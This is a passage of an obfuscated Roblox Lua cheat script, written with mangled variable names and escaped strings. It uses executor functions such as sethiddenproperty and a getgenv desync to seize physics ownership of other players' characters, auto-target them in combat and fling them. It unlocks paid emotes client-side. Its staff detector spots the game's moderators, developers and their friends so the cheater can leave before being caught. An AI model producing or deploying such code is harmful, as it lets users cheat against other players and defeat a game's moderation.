 if _IIIlIlllII and _IIIlIlllII.Parent then _IIIlIlllII.AssemblyLinearVelocity = Vector3.zero _IIIlIlllII.AssemblyAngularVelocity = Vector3.zero pcall( function () _IIIlIlllII.Velocity = Vector3.zero end
 ) pcall( function () _IIIlIlllII.RotVelocity = Vector3.zero end
 ) end
 if not _llIllIIIII or not _IIIlIIllll then return end
 _IIIlIlllII = _llIllIIIII _lIIllIIIII = _IIIlIIllll if _IllIlllIll then _IllIlllIll:Disconnect() _IllIlllIll = nil end
 local _IlIlllIIII = _llIllIIIII.Parent and _llIllIIIII.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIlllIIII then _IllIlllIll = RunService.RenderStepped:Connect( function () if _IlIlllIIII and _IlIlllIIII.Parent then pcall( function () _IlIlllIIII.AutoRotate = false end
 ) end
 end
 ) end
 _llIllIIIII.CFrame = _IIIlIIllll.CFrame * CFrame.new(0x0, 0x0, 0x5) _llIllIIIII.AssemblyLinearVelocity = Vector3.zero _llIllIIIII.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _llIllIIIII) end
 ) pcall( function () sethiddenproperty(_llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIlIIllll) end
 ) end
 local _llllIllIll _llllIllIll = RunService.Heartbeat:Connect( function () if not _llIllIIIII or not _llIllIIIII.Parent or not _IIIlIIllll or not _IIIlIIllll.Parent then _llllIllIll:Disconnect() if _IlIIllIlIl == _llllIllIll then _IlIIllIlIl = nil end
 if sethiddenproperty then if _llIllIIIII and _llIllIIIII.Parent then pcall( function () sethiddenproperty(_llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _IIIlIIllll and _IIIlIIllll.Parent then pcall( function () sethiddenproperty(_IIIlIIllll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 if _llIllIIIII and _llIllIIIII.Parent then _llIllIIIII.AssemblyLinearVelocity = Vector3.zero _llIllIIIII.AssemblyAngularVelocity = Vector3.zero pcall( function () _llIllIIIII.Velocity = Vector3.zero end
 ) pcall( function () _llIllIIIII.RotVelocity = Vector3.zero end
 ) end
 return end
 _llIllIIIII.CFrame = _IIIlIIllll.CFrame * CFrame.new(0x0, 0x0, 0x5) _llIllIIIII.AssemblyLinearVelocity = Vector3.zero _llIllIIIII.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIlIIllll) end
 ) end
 end
 ) _IlIIllIlIl = _llllIllIll end
 local function _IIIIIIIIIl() _lIlIIllIlI() end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI == _llIlIIlIll then continue end
 local _lIIIIIlIll = _lIlIIIIlII(_lIIlIIlllI) local _lIIlIIIIlI = _lIIIIIlIll and _lIIIIIlIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIIlIIIIlI then local _lIIlllIIII = _lIIlIIIIlI.Died:Connect( function () local _IllllIIllI = _lIlIIIIlII(_lIIlIIlllI) if _IllllIIllI then _IllllIIllI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 ) table.insert(_IlIIIlIIII, _lIIlllIIII) end
 local _IIIIlIllII = _lIIlIIlllI.CharacterAdded:Connect( function (_IllllIIllI) task.wait(0.1) if _IllllIIllI then _IllllIIllI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 ) table.insert(_IlIIIlIIII, _IIIIlIllII) end
 task.spawn( function () local _IlIIllIIll = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") if _IlIIllIIll then local _IlllIIIIII = _IlIIllIIll.AncestryChanged:Connect( function () if not _IlIIllIIll:IsDescendantOf(workspace) then pcall( function () _IlIIllIIll:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 ) end
 end
 ) table.insert(_IlIIIlIIII, _IlllIIIIII) end
 end
 ) local function _llIlIlIIll() local _lllllIIlII = {} local _IlIIIIIllI = {} for _lIIlIllIlI, _lIIlIIlllI in pairs(_IIIllllIII()) do if table.find(RevenantWhitelist, _lIIlIIlllI) then continue end
 local _lIIIIIlIll = _lIlIIIIlII(_lIIlIIlllI) local _IIllIllIIl = _lIIIIIlIll and (_lIIIIIlIll:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") or _lIIIIIlIll:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") or _lIIIIIlIll:FindFirstChild("\066\101\105\110\103\071\114\097\098\098\101\100") or _lIIIIIlIll:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") or _lIIIIIlIll:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114")) if _lIIIIIlIll and not _IIllIllIIl and not _lIIIIIlIll:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then if not (_lIIIIIlIll:GetAttribute("\085\108\116\101\100") and _lIIIIIlIll:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\116\116\101\114") then if _IlIllIlIII(_lIIlIIlllI) then table.insert(_lllllIIlII, _lIIlIIlllI) else table.insert(_IlIIIIIllI, _lIIlIIlllI) end
 end
 end
 end
 if #_lllllIIlII > 0x0 then return _lllllIIlII[math.random(0x1, #_lllllIIlII)] end
 if #_IlIIIIIllI > 0x0 then return _IlIIIIIllI[math.random(0x1, #_IlIIIIIllI)] end
 local _IlIIllIlll = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _lIlllIIlII = _IlIIllIlll and (_IlIIllIlll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IlIIllIlll.PrimaryPart) local _lIIlIlllII = _IlIIllIlll and _IlIIllIlll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlllIIlII and _lIIlIlllII and _lIIlIlllII.Health > 0x0 and not _IlIIllIlll:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") and not _IlIIllIlll:GetAttribute("\070\114\101\101\122\101") and not _IlIIllIlll:FindFirstChild("\066\101\105\110\103\071\114\097\098\098\101\100") and not _IlIIllIlll:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") and not _IlIIllIlll:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114") then return _IlIIllIlll end
 return nil end
 local _IllIlIlIll = _llIlIlIIll() local _lllllIIIlI = _IllIlIlIll == workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _lIlIIllIlI = _lllllIIIlI and _IllIlIlIll or (_IllIlIlIll and _lIlIIIIlII(_IllIlIlIll)) do local _IlIIIllIIl = _lIlIIIIlII(_llIlIIlIll) local _llIllIIIII = _IlIIIllIIl and _lIlIlIIlII(_IlIIIllIIl) local _IlIIllIIlI = _lIlIIllIlI and (_lIlIIllIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _lIlIlIIlII(_lIlIIllIlI)) if _llIllIIIII and _IlIIllIIlI then _IlIlIlIIlI(_llIllIIIII, _IlIIllIIlI) end
 if _lllllIIIlI and _lIlIIllIlI then _lIlIIllIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 end
 local function _llllIIIlll(_lIIllllIll, hitConfirmed) _lIlIIllIlI() if hitConfirmed and _lIlIIllIlI then _lIlIIllIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 _lllIIIlIII = false local _IllIllllll = _lIIllllIll == workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") _IllIlIlIll = _IllIllllll and nil or _lIIllllIll _lIlIIllIlI = _IllIllllll and _lIIllllIll or (_lIIllllIll and _lIlIIIIlII(_lIIllllIll)) if _IllIllllll and _lIlIIllIlI then _lIlIIllIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 local _IlIIIllIIl = _lIlIIIIlII(_llIlIIlIll) local _llIllIIIII = _IlIIIllIIl and _lIlIlIIlII(_IlIIIllIIl) local _lllllIlIIl = _lIlIIllIlI and (_lIlIIllIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _lIlIlIIlII(_lIlIIllIlI)) if _llIllIIIII and _lllllIlIIl then _IlIlIlIIlI(_llIllIIIII, _lllllIlIIl) end
 end
 local _IllllIlllI = false local _IllIIlIllI _IllIIlIllI = RunService.Heartbeat:Connect( function () if _IllllIlllI then _IllIIlIllI:Disconnect() _IIIIIIIIIl() for _lIIlIllIlI, _IlIlIllIll in pairs(_IlIIIlIIII) do pcall( function () _IlIlIllIll:Disconnect() end
 ) end
 _IlIIIlIIII = {} return end
 if not animTrack.IsPlaying then _IllIIlIllI:Disconnect() _IIIIIIIIIl() for _lIIlIllIlI, _IlIlIllIll in pairs(_IlIIIlIIII) do pcall( function () _IlIlIllIll:Disconnect() end
 ) end
 _IlIIIlIIII = {} if _lllIIIlIII and _lIlIIllIlI and _lIlIIllIlI ~= workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") then _lIlIIllIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 return end
 if animTrack.TimePosition >= 0x1 then for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll then local _lIIIIIlIll = _lIlIIIIlII(_lIIlIIlllI) if _lIIIIIlIll then _lIIIIIlIll:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 end
 end
 local _IlIIIllIIl = _lIlIIIIlII(_llIlIIlIll) local _llIllIIIII = _IlIIIllIIl and _lIlIlIIlII(_IlIIIllIIl) local _lIlIIlIIll = _IlIIIllIIl and _IIIlIIIIll(_IlIIIllIIl) for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI == _llIlIIlIll then continue end
 local _lIIIIIlIll = _lIlIIIIlII(_lIIlIIlllI) local _lIIlIIIIlI = _lIIIIIlIll and _lIIIIIlIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IlIIIlIIlI = _lIIIIIlIll and _lIIIIIlIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lIIlIIIIlI or not _IlIIIlIIlI then continue end
 if _lIIIIIlIll:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then continue end
 if _lIIIIIlIll:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") or _lIIIIIlIll:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") or _lIIIIIlIll:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114") then continue end
 if _IIIIIIIIII(_lIIlIIIIlI, "\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") and _lIlIIlIIll and _IIIIIIIIII(_lIlIIlIIll, "\049\051\049\050\050\054\052\051\048\052\054\057\057\051\049") then if _IllIlIlIll == _lIIlIIlllI then _lllIIIlIII = true local next = _llIlIlIIll() if next and next ~= _IllIlIlIll then _llllIIIlll(next, true) elseif not next then _lIlIIllIlI() if _lIlIIllIlI then _lIlIIllIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 _IllllIlllI = true end
 end
 end
 end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI == _llIlIIlIll then continue end
 local _lIIIIIlIll = _lIlIIIIlII(_lIIlIIlllI) local _lIIlIIIIlI = _lIIIIIlIll and _lIIIIIlIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IlIIIlIIlI = _lIIIIIlIll and _lIIIIIlIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _lIIlIIIIlI or not _IlIIIlIIlI then continue end
 if _lIIIIIlIll:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then continue end
 if _lIIIIIlIll:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") or _lIIIIIlIll:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") or _lIIIIIlIll:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114") then continue end
 if _IIIIIIIIII(_lIIlIIIIlI, "\056\048\057\049\048\048\054\053\052\052\055\050\048\054") then if _llIllIIIII and _IlIIIlIIlI then local _lllIlIllII = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") if _lIlIIllIlI and _lIlIIllIlI == _lllIlIllII then _lIlIIllIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 _IlIlIlIIlI(_llIllIIIII, _IlIIIlIIlI) _lIIIIIlIll:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) _IllIlIlIll = _lIIlIIlllI _lIlIIllIlI = _lIIIIIlIll _lllIIIlIII = true end
 end
 end
 do local _IlIIllIIll = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _IllIlIIlIl = _IlIIllIIll and _IlIIllIIll:FindFirstChild("\072\117\109\097\110\111\105\100") local _IllllIIIll = _IllIlIIlIl and _IllIlIIlIl:FindFirstChild("\065\110\105\109\097\116\111\114") local function _lIlIlllIll(_IlIIIllllI) if not _IllllIIIll then return false end
 for _lIIlIllIlI, _lIIIllllII in pairs(_IllllIIIll:GetPlayingAnimationTracks()) do if _lIIIllllII.Animation.AnimationId:match(_IlIIIllllI) then return true end
 end
 return false end
 if _IlIIllIIll and _IllIlIIlIl and not _IlIIllIIll:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then if _lIlIlllIll("\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") or _lIlIlllIll("\056\048\057\049\048\048\054\053\052\052\055\050\048\054") then _IlIIllIIll:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) if _lIlIlllIll("\056\048\057\049\048\048\054\053\052\052\055\050\048\054") then local _IlIlIlIIll = _lIlIIIIlII(_llIlIIlIll) local _llIlIlIIIl = _IlIlIlIIll and _IIIlIIIIll(_IlIlIlIIll) if _llIlIlIIIl and _IIIIIIIIII(_llIlIlIIIl, "\049\051\049\050\050\054\052\051\048\052\054\057\057\051\049") then task.spawn( function () task.wait(1.2) local _IlIlllIlIl = _lIlIIIIlII(_llIlIIlIll) local _lllIllIlll = _IlIlllIlIl and _lIlIlIIlII(_IlIlllIlIl) if not _lllIllIlll then return end
 if (tonumber(_llIlIIlIll:GetAttribute("\085\108\116\105\109\097\116\101")) or 0x0) >= 0x64 then return end
 getgenv().desync = { CFrame = CFrame.new(0x0, -0x7148, 0x0) } task.wait(0.65) getgenv().desync = nil end
 ) end
 end
 if _lIlIIllIlI == _IlIIllIIll then _lIlIIllIlI() local next = _llIlIlIIll() if next and next ~= _IlIIllIIll then _llllIIIlll(next, false) else _IllllIlllI = true end
 end
 end
 end
 end
 if _lIlIIllIlI and not _lIlIIllIlI.Parent then pcall( function () _lIlIIllIlI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 ) local next = _llIlIlIIll() if next then _llllIIIlll(next, false) else _IllllIlllI = true end
 end
 local _IIIIIllIIl = _lIlIIllIlI and (_lIlIIllIlI:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") or _lIlIIllIlI:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") or _lIlIIllIlI:FindFirstChild("\066\101\105\110\103\071\114\097\098\098\101\100") or _lIlIIllIlI:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") or _lIlIIllIlI:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114")) if _IIIIIllIIl then local next = _llIlIlIIll() if next and next ~= _IllIlIlIll then _llllIIIlll(next, false) elseif not next then _IllllIlllI = true end
 end
 end
 ) end
 end
 ) _llIIIIlIIl[#_llIIIIlIIl+0x1] = _lIlllIllII.AnimationPlayed:Connect( function (animTrack) if not _llIIllIlll.SkillThrow or not _llIIllIlll.SkillThrow.Value then return end
 local _llIlllIIIl = animTrack.Animation.AnimationId local _IIlIllIIIl = _lIIlIllIlI.SkillThrowMoves and _lIIlIllIlI.SkillThrowMoves.Value if not _IIlIllIIIl then return end
 local _IlIIIllIIl = _lIlIIIIlII(_llIlIIlIll) local _llIllIIIII = _IlIIIllIIl and _lIlIlIIlII(_IlIIIllIIl) if not _llIllIIIII then return end
 if _llIlllIIIl:match("\049\050\051\048\057\056\051\053\049\048\053") and rawget(_IIlIllIIIl, "\072\117\110\116\101\114\115\032\071\114\097\115\112") then task.spawn( function () task.wait(0.3) local _IIIllIIIIl = _llIllIIIII.CFrame game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_llIllIIIII, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), { CFrame = _llIllIIIII.CFrame * CFrame.new(0x0, 0x9C4, 0x0), }):Play() task.wait(0.8) _IIlllIIlIl(_IIIllIIIIl) end
 ) elseif _llIlllIIIl:match("\049\052\048\048\052\050\051\053\055\055\055") and rawget(_IIlIllIIIl, "\072\111\109\101\114\117\110") then task.spawn( function () task.wait(0.4) local _IIIllIIIIl = _llIllIIIII.CFrame game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_llIllIIIII, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), { CFrame = _llIllIIIII.CFrame * CFrame.new(0x0, 0x2710, 0x0), }):Play() task.wait(0x1) _IIlllIIlIl(_IIIllIIIIl) end
 ) end
 end
 ) local function _IIIIlIIIIl(enemyPlayer) local function _lIIlIlIllI(_lIIlIllIIl) local _llIIIIIllI = _lIIlIllIIl and _IIIlIIIIll(_lIIlIllIIl) if not _llIIIIIllI then return end
 _llIIIIlIIl[#_llIIIIlIIl+0x1] = _llIIIIIllI.AnimationPlayed:Connect( function (_IlIlIlIlIl) local _llIIIlIIIl = _IlIlIlIlIl.Animation.AnimationId local _IlIIIllIIl = _lIlIIIIlII(_llIlIIlIll) local _lIlIIlIIll = _IlIIIllIIl and _IIIlIIIIll(_IlIIIllIIl) if _llIIIlIIIl:match("\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") then if _lIlIIlIIll and _IIIIIIIIII(_lIlIIlIIll, "\049\051\053\049\048\052\050\049\048\052\048\048\054\049\048") then if _lIIlIllIIl then _lIIlIllIIl:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 end
 elseif _llIIIlIIIl:match("\056\048\057\049\048\048\054\053\052\052\055\050\048\054") then if _lIlIIlIIll and _IIIIIIIIII(_lIlIIlIIll, "\049\051\053\049\048\052\050\049\048\052\048\048\054\049\048") then if _lIIlIllIIl then _lIIlIllIIl:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 end
 end
 end
 ) end
 local _lIIlIllIIl = _lIlIIIIlII(enemyPlayer) if _lIIlIllIIl then _lIIlIlIllI(_lIIlIllIIl) end
 _IlIllIlIIl[#_IlIllIlIIl+0x1] = enemyPlayer.CharacterAdded:Connect( function (newChar) task.wait(0.5) _lIIlIlIllI(newChar) end
 ) end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll then _IIIIlIIIIl(_lIIlIIlllI) end
 end
 _IlIllIlIIl[#_IlIllIlIIl+0x1] = Players.PlayerAdded:Connect( function (_lIIlIIlllI) task.wait(0x1) _IIIIlIIIIl(_lIIlIIlllI) end
 ) end
 end
 task.spawn(_lIIlIIIlII) _IlIllIlIIl[#_IlIllIlIIl+0x1] = _llIlIIlIll.CharacterAdded:Connect( function () task.spawn(_lIIlIIIlII, true) end
 ) table.insert(_IllIllIIll, function () for _lIIlIllIlI, _IllIIlIllI in pairs(_llIIIIlIIl) do _IllIIlIllI:Disconnect() end
 table.clear(_llIIIIlIIl) for _lIIlIllIlI, _IllIIlIllI in pairs(_IlIllIlIIl) do _IllIIlIllI:Disconnect() end
 table.clear(_IlIllIlIIl) if _lllllllIll then _lllllllIll:Destroy() _lllllllIll = nil end
 pcall( function () _llIIllIlll["\065\117\116\111\095\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"]:SetValue(false) end
 ) pcall( function () _llIIllIlll.TouchFlingEnabled:SetValue(false) end
 ) pcall( function () _llIIllIlll.TogWeld:SetValue(false) end
 ) pcall( function () _llIIllIlll.CustomFrontDash:SetValue(false) end
 ) pcall( function () _llIIllIlll.CustomSideDash:SetValue(false) end
 ) pcall( function () _llIIllIlll.CustomBackDash:SetValue(false) end
 ) _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] = false local _IlIIIllIIl = _llIlIIlIll.Character local _lIlIIlIIll = _IlIIIllIIl and _IlIIIllIIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIlIIll then pcall( function () _lIlIIlIIll.AutoRotate = true end
 ) end
 end
 ) end
 end
 if _lllIIllIII then task.spawn( function () pcall( function () _G.FreeEmotes = true _llIlIIlIll:SetAttribute("\069\109\111\116\101\083\101\097\114\099\104\066\097\114", true) _llIlIIlIll:SetAttribute("\069\120\116\114\097\083\108\111\116\115", true) _llIlIIlIll:SetAttribute("\069\109\111\116\101\080\097\103\101\115", true) end
 ) end
 ) end
 if _lllIIllIII and _lIIIlIIIlI.Misc then local ReplicatedStorage = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101") local TeleportService = game:GetService("\084\101\108\101\112\111\114\116\083\101\114\118\105\099\101") local function _Illlllllll() pcall( function () game:GetService("\080\108\097\121\101\114\115").LocalPlayer:Kick("\092\110\091\090\075\065\089\084\083\066\093\092\110\065\110\116\105\099\104\101\097\116\032\084\114\105\103\103\101\114\101\100\044\032\089\111\117\032\119\101\114\101\032\114\101\112\111\114\116\101\100\032\102\111\114\032\101\120\112\108\111\105\116\105\110\103\046") end
 ) end
 end
 local _IIIlIlIlIl = "\085\110\107\110\111\119\110" pcall( function () local _IIlIIIIlII = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101"):WaitForChild("\071\101\116\083\101\114\118\101\114\084\121\112\101", 0x1) if _IIlIIIIlII then _IIIlIlIlIl = _IIlIIIIlII:InvokeServer() end
 end
 ) local function _IIlllIIIII(_lIIlIIlllI) if typeof(_lIIlIIlllI) ~= "\116\097\098\108\101" or not _lIIlIIlllI then _lIIlIIlllI = nil end
 local _lIlIlIlIlI = game:GetService("\080\108\097\121\101\114\115") local _lllIlIIlIl = game:GetService("\084\101\108\101\112\111\114\116\083\101\114\118\105\099\101") local _IlIlIIIlII = _lIlIlIlIlI.LocalPlayer local _lllIIIlIIl = game.PrivateServerId ~= '' or #_lIlIlIlIlI:GetPlayers() <= 0x1 if _lllIIIlIIl then pcall( function () _IlIlIIIlII:Kick(_lIIlIIlllI and (_lIIlIIlllI.Message or "\082\101\106\111\105\110\105\110\103\046\046\046\046") or "\082\101\106\111\105\110\105\110\103\046\046\046\046") end
 ) task.wait() pcall( function () _lllIlIIlIl:Teleport(game.PlaceId, _IlIlIIIlII) end
 ) else pcall( function () _IlIlIIIlII:Kick(_lIIlIIlllI and (_lIIlIIlllI.Message or "\082\101\106\111\105\110\105\110\103\046\046\046\046") or "\082\101\106\111\105\110\105\110\103\046\046\046\046") end
 ) task.delay(_lIIlIIlllI and _lIIlIIlllI.Delay or 0.1, function () pcall( function () _lllIlIIlIl:TeleportToPlaceInstance(game.PlaceId, game.JobId, _IlIlIIIlII) end
 ) end
 ) end
 end
 local _lIlIllIllI, TabMiscScripts, TabMiscExtra, TabMiscLeaderboard if _lllIIllIII and _lIIIlIIIlI.Misc then _lIlIllIllI = _lIIIlIIIlI.Misc:AddLeftGroupbox("\083\116\097\102\102\032\068\101\116\101\099\116\111\114", "\103\097\118\101\108") TabMiscScripts = _lIIIlIIIlI.Misc:AddLeftGroupbox("\083\099\114\105\112\116\115", "\102\111\108\100\101\114") TabMiscExtra = _lIIIlIIIlI.Misc:AddRightGroupbox("\069\120\116\114\097", "\112\108\117\115") TabMiscLeaderboard = _lIIIlIIIlI.Misc:AddRightGroupbox("\076\101\097\100\101\114\098\111\097\114\100", "\109\111\110\105\116\111\114") end
 if _lllIIllIII and _lIIIlIIIlI.Misc then local _IlIlIllIlI = _lIlIllIllI local _lllIllIIIl = { 0x1932BAD7, 0xBCF405C, 0x289D6CE4, 0xCB841A55, 0x143E65A3, 0x19B00819, 0x798D9C24, 0x704511B, 0x3C88C39C, 0xFBB786A, 0x6BACBF3, 0x8831CA42, 0x4B7C4F49, 0xBA014FC6, 0x446F3955, 0x61592AF6, 0xC7AD29C6, 0x39E33D32, 0x276A3BD8, 0x3F0B0B9, 0x49C26B1, 0x9F973F4, 0x7A817ED3, 0x87681E0, 0x1A295AD5, 0x52EB0917, 0x6B152DB5, 0xF3D3DB2, 0xBC7A2E32, 0x3F2750C3, 0x4B1887AB, 0x1DA178B, 0x3E19A2F4, 0x3B4E67FD, 0x563ACD39, 0x49EF265, 0x3BADC058, 0x9707BD75, 0x1290386E7, } local function _IlIIllIIlI(_IlIlIIIlII) if _IlIlIIIlII == _llIlIIlIll then return end
 local _IlllIlIlll = _IlIlIIIlII.DisplayName local _IllIlIlIII = _IlllIlIlll .. "\040\064" .. _IlIlIIIlII.Name .. "\041" local _lIlIIIlIlI = _lIIlIllIlI.LeaveOnDropdown and _lIIlIllIlI.LeaveOnDropdown.Value or {} local function _IlllIllllI(typeStr, customMsg) if _lIlIIIlIlI[typeStr] then _llIlIIlIll:Kick("\092\110\091\090\075\065\089\084\083\066\093\092\110" .. _IllIlIlIII .. "\032\106\111\105\110\101\100\046\092\110\084\104\101\121\039\114\101\032\102\108\097\103\103\101\100\032\097\115\058\032" .. typeStr .. "\046") else _IIIllIIlll:Notify({ Title = _IlIIIlllII("\072\101\097\100\115\032\117\112"), Content = customMsg, _IlllIlIllI = 0xA }) end
 end
 local _llllllllII, inGroup = pcall( function () return _IlIlIIIlII:IsInGroup(0xB74DCF) end
 ) if _llllllllII and inGroup then local _llIIIlIllI, role = pcall( function () return _IlIlIIIlII:GetRoleInGroup(0xB74DCF) end
 ) local _lllIIlIIll = false local _lllIIIllIl = (_llIIIlIllI and role) and role or "\063" if _llIIIlIllI and role then local _IIIlIIIIIl = role:lower() _lllIIlIIll = _IIIlIIIIIl:find("\109\111\100\101\114\097\116\111\114") or _IIIlIIIIIl:find("\100\101\118\101\108\111\112\101\114") or _IIIlIIIIIl:find("\099\111\110\116\114\105\098\117\116\111\114") or _IIIlIIIIIl:find("\116\101\115\116\101\114") or _IIIlIIIIIl:find("\111\119\110\101\114") or _IIIlIIIIIl:find("\097\110\111\109\097\108\121\032\112\108\097\121\101\114") end
 if _lllIIlIIll then _IlllIllllI("\083\116\097\102\102", _IllIlIlIII .. "\032\105\115\032\097\032\115\116\097\102\102\032\040" .. _lllIIIllIl .. "\041\046\032\104\101\097\100\115\032\117\112\046") return end
 end
 for _lIIlIllIlI, _IlIIIllllI in ipairs(_lllIllIIIl) do if _IlIlIIIlII.UserId == _IlIIIllllI then _IlllIllllI("\083\112\101\099\105\097\108\032\080\101\111\112\108\101", _IllIlIlIII .. "\032\105\115\032\097\032\112\111\115\115\105\098\108\101\032\109\111\100\046") return end
 end
 local _lllllIIIIl = {} for _lIIlIllIlI, _IlIIIllllI in ipairs(_lllIllIIIl) do local _llIIIlIllI, isFriend = pcall( function () return _IlIlIIIlII:IsFriendsWith(_IlIIIllllI) end
 ) if _llIIIlIllI and isFriend then local _lllIIllIlI, _IIIIIllIll = pcall( function () return Players:GetNameFromUserIdAsync(_IlIIIllllI) end
 ) if _lllIIllIlI then local _IlllIlIlll = _IIIIIllIll pcall( function () local _IlIIIIIlIl = game:GetService("\085\115\101\114\083\101\114\118\105\099\101"):GetUserInfosByUserIdsAsync({_IlIIIllllI}) if _IlIIIIIlIl and _IlIIIIIlIl[0x1] then _IlllIlIlll = _IlIIIIIlIl[0x1].DisplayName end
 end
 ) _lllllIIIIl[#_lllllIIIIl+0x1] = _IlllIlIlll .. "\040\064" .. _IIIIIllIll .. "\041" end
 end
 end
 if #_lllllIIIIl > 0x0 then _IlllIllllI("\070\114\105\101\110\100\115\032\119\105\116\104\032\083\116\097\102\102", _IllIlIlIII .. "\032\105\115\032\102\114\105\101\110\100\115\032\119\105\116\104\032" .. table.concat(_lllllIIIIl, "\044\032") .. "\046") end
 end
